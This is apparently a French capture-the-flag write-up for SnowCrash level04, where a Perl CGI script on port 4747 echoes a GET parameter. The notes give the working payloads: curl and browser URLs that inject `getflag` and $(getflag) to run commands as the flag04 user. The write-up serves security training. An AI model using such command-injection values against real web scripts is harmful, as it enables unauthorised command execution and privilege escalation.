# apparition de la ligne suivante lors d'une recherche de fichiers :
/rofs/var/www/level04

# details du dossier: 
level00@SnowCrash:~$ ls -la /var/www/
total 4
drwxr-xr-x  1 root   root    100 Jun 15 09:31 .
drwxr-xr-x  1 root   root    160 Mar 12  2016 ..
-r-xr-x---+ 1 root   root    177 Aug 30  2015 index.html
dr-xr-x---+ 2 flag04 level04  60 Jun 15 09:31 level04
dr-xr-x---+ 2 flag12 level12  60 Jun 15 09:31 level12

=> le script perl print le parametre x d'une requete GET sur le port 4747 du serveur
curl http://192.168.56.2:4747?x=12

=> la version de bash est exploitable par shellshock :
level04@SnowCrash:~$ echo $BASH_VERSION
4.2.25(1)-release

# exploit d'un script perl utilisant les CGI : 
https://www.perl.com/article/115/2014/9/26/Shellshock-and-Perl/
https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?utm_source=dlvr.it&utm_medium=twitter

# le script perl est executé avec les droits de flag04 : -r-xr-x---+ 1 flag04 level04 152 Jun 19 14:18 level04.pl
la commande : curl localhost:4747?x=\`getflag\` execute getflag en tant que flag04
les backquotes permettent d'evaluer la commande au moment du echo a la maniere d'un : echo `ls`
il est important d'evaluer la commande a l'interieur du script et non au moment du curl sinon le getflag est executé en tant que level04

les commandes qui evaluent getflag a l'interieur d'un navigateur fonctionnent : 
http://192.168.56.2:4747/?x=`getflag`
http://192.168.56.2:4747/?x=$(getflag)